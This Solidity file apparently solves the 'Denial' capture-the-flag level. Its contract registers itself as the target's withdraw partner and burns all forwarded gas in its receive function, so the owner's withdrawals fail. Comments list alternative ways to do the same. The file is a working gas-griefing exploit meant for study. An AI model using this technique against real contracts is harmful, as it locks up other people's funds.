// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Denial/Denial.sol";

contract DenialAttack {
    using SafeMath for uint256;

    Denial public target;

    constructor(address _target) public {
        target = Denial(payable(_target));
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        for (uint256 i = 0; i < 1_000_000; i++) {
            assembly {
                let x := sload(i)
            }
        }

        // assert(false); // this works, as well

        // assembly {
        //     invalid() // this works, as well
        // }

        // assembly {
        //     let v := mload(100000) // this does not work. Total gas consumed =  100_000 * 3 + ((100_000 ** 2) / 512)
        // }
    }
}
